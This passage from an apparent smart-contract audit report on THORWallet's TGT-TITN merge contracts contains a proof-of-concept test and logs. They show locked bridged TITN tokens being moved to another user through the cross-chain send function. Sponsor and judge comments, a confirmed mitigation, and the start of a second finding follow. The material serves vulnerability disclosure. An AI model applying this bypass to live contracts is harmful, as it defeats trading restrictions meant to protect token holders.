<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">transferAndCall</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'100'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">), </span><span class="mtk8">'0x'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// claim TITN</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">claimableAmount</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">claimableTitnPerUser</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">claimTitn</span><span class="mtk1">(</span><span class="mtk12">claimableAmount</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// attempt to transfer TITN (spoiler alert: it should fail)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">try</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'1'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">expect</span><span class="mtk1">.</span><span class="mtk11">fail</span><span class="mtk1">(</span><span class="mtk8">'Transaction should have reverted'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            } </span><span class="mtk15">catch</span><span class="mtk1"> (</span><span class="mtk12">error</span><span class="mtk1">: </span><span class="mtk10">any</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">error</span><span class="mtk1">.</span><span class="mtk12">message</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">include</span><span class="mtk1">(</span><span class="mtk8">'BridgedTokensTransferLocked'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Minting an initial amount of tokens to ownerA's address in the TITN contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">initialAmount</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'1000000000'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Defining the amount of tokens to send and constructing the parameters for the send operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">tokensToSend</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'1'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Defining extra message execution options for the send operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">options</span><span class="mtk1"> = </span><span class="mtk12">Options</span><span class="mtk1">.</span><span class="mtk11">newOptions</span><span class="mtk1">().</span><span class="mtk11">addExecutorLzReceiveOption</span><span class="mtk1">(</span><span class="mtk7">200000</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">).</span><span class="mtk11">toHex</span><span class="mtk1">().</span><span class="mtk11">toString</span><span class="mtk1">()</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">sendParam</span><span class="mtk1"> = [</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">eidA</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">zeroPad</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">32</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">options</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Fetching the native fee for the token send operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> [</span><span class="mtk12">nativeFee</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">quoteSend</span><span class="mtk1">(</span><span class="mtk12">sendParam</span><span class="mtk1">, </span><span class="mtk4">false</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Executing the send operation from TITN contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">startBalanceBOnBase</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk12">sendParam</span><span class="mtk1">, [</span><span class="mtk12">nativeFee</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">], </span><span class="mtk12">user1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, { </span><span class="mtk12">value:</span><span class="mtk1"> </span><span class="mtk12">nativeFee</span><span class="mtk1"> })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">finalBalanceBOnBase</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">startBalanceBOnBase</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">eql</span><span class="mtk1">(</span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'0'</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">finalBalanceBOnBase</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">eql</span><span class="mtk1">(</span><span class="mtk12">tokensToSend</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">())</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Fetching the native fee for the token send operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">sendParam2</span><span class="mtk1"> = [</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">eidB</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">zeroPad</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">32</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">options</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> [</span><span class="mtk12">nativeFee2</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">quoteSend</span><span class="mtk1">(</span><span class="mtk12">sendParam2</span><span class="mtk1">, </span><span class="mtk4">false</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">startBalanceBOnArb</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk12">sendParam2</span><span class="mtk1">, [</span><span class="mtk12">nativeFee</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">], </span><span class="mtk12">user2</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, { </span><span class="mtk12">value:</span><span class="mtk1"> </span><span class="mtk12">nativeFee2</span><span class="mtk1"> })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">finalBalanceBOnArb</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"before user2 balance: "</span><span class="mtk1">, </span><span class="mtk12">startBalanceBOnArb</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"after user2 balance: "</span><span class="mtk1">, </span><span class="mtk12">finalBalanceBOnArb</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">startBalanceBOnArb</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">eql</span><span class="mtk1">(</span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'0'</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">finalBalanceBOnArb</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">eql</span><span class="mtk1">(</span><span class="mtk12">tokensToSend</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">())</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        })</span></span></span></code></pre>
<p><strong>Logs</strong>:</p>
<pre data-index="6" data-language="console" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">before user2 balance:  BigNumber { value: "0" }</span></span>
<span class="grvsc-line"><span class="grvsc-source">after user2 balance:  BigNumber { value: "1000000000000000000" }</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ✔ user1  transfer TITN tokens to user2 by bridge when transfer disable</span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-1"><a class="anchor before" aria-label="recommended mitigation steps 1 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>It is recommended to also disable the <code>send</code> function when <code>isBridgedTokensTransferLocked</code> is set to true. Alternatively, add the <code>_validateTransfer</code> check to the <code>mint</code>/<code>burn</code> functions.</p>
<p><strong>cacaomatt (THORWallet) confirmed</strong></p>
<p><strong><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe">0xnev (judge) commented</a>:</strong></p>
<blockquote>
<p>Valid finding, medium severity as of now, given although the invariant is broken, afiak, no direct fund loss or exploit is possible.</p>
<p>There is a case of speculative trading to price the tokens that directly go against another invariant. Would take any comments that makes a case for high severity regarding this impact.</p>
<blockquote>
<p>Bridged TITN Tokens: Transfers are restricted to a pre-defined address (transferAllowedContract), set by the admin. Initially, this address will be the staking contract to prevent trading until the <code>isBridgedTokensTransferLocked flag</code> is disabled by the admin.</p>
</blockquote>
</blockquote>
<p><strong><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe&amp;commentChild=kvGZUdiBJnb">cryptoxz (THORWallet) commented</a>:</strong></p>
<blockquote>
<p>One of the main points to add this restriction was to prevent users to create a trading pool before TGE. We would like to explore more this issue as that would be a high concern for us.</p>
</blockquote>
<p><strong><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe&amp;commentChild=EUqvh6hKDrp">cacaomatt (THORWallet) confirmed and commented</a>:</strong></p>
<blockquote>
<p>We’ve created a PR for this <a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4">here</a>.</p>
</blockquote>
<p><strong><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe&amp;commentChild=m5ogg9Phf9Y">0xnev (judge) commented</a>:</strong></p>
<blockquote>
<p>Raising to high severity, as of now, given the possible impact of speculative trading I mentioned above</p>
</blockquote>
<p><strong><a href="https://github.com/code-423n4/2025-03-thorwallet-mitigation?tab=readme-ov-file#findings-being-mitigated">THORWallet mitigated</a>:</strong>.</p>
<blockquote>
<p>The PR <a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/tree/audit-4">here</a> only allows bridging to the sender’s own address.</p>
</blockquote>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-4">shaflow2</a>, <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-9">web3km</a>, and <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-13">kn0t</a>.</p>
<hr>
<h1 style="position:relative;" id="medium-risk-findings-1"><a class="anchor before" aria-label="medium risk findings 1 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#medium-risk-findings-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Medium Risk Findings (1)</h1>
<h2 style="position:relative;" id="m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector"><a class="anchor before" aria-label="m 1 improper transfer restrictions on non bridged tokens due to boolean bridged token tracking allowing a dos attack vector permalink" href="https://code4rena.com/reports/2025-02-thorwallet#m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7">[M-1] Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-125">Limbooo</a>, also found by <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-680">0xAadi</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-40">0xAsen</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-51">0xAsen</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-128">0xastronatey</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-559">0xcrazyboy999</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-759">0xdoichantran</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-577">0xhp9</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-416">0xIconart</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-756">0xlemon</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-132">0xloscar01</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-691">0xMosh</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-578">0xTonraq</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-612">0xvd</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-611">0xyuri</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-231">4B</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-194">Abdessamed</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-438">Abdul</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-531">agadzhalov</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-499">Agorist</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-98">aldarion</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-412">Alekso</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-33">Arjuna</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-67">arnie</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-53">attentioniayn</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-476">bani</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-145">Benterkiii</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-370">Bz</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-46">classic-k</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-767">Daniel_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-127">Daniel526</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-751">dobrevaleri</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-650">doublekk</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-651">eLSeR17</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-735">EPSec</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-749">falconhoof</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-79">farismaulana</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-260">felconsec</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-788">francoHacker</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-381">gesha17</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-335">ginlee</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-716">HappyTop0603</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-238">hearmen</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-239">hearmen</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-633">Heavyweight_hunters</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-580">hyuunn</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-637">hyuunn</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-623">iam_emptyset</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-368">iamandreiski</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-227">Illoy-Scizceneghposter</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-524">inh3l</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-646">Ishenxx</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-387">jesjupyter</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-168">jsonDoge</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-257">ka14ar</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-346">kn0t</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-502">KupiaSec</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-229">lanyi2023</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-474">laxraw</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-385">leegh</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-414">matrix_0wl</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-243">misbahu</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-8">montecristo</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-378">MSK</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-808">Mylifechangefast_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-525">MysteryAuditor</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-647">NHristov</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-521">PabloPerez</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-119">pairingfriendly</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-264">patitonar</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-655">peanuts</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-460">phoenixV110</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-538">REKCAH</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-91">Sabit</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-398">shaflow2</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-487">shaflow2</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-408">Sherlock__VARM</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-557">Shipkata494</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-151">silver_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-164">SpicyMeatball</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-506">theboiledcorn</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-511">theboiledcorn</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-52">undefined_joe</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-425">vladi319</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-115">web3km</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-673">X0sauce</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-357">y4y</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-305">YouCrossTheLineAlfie</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-172">Zach_166</a>, and 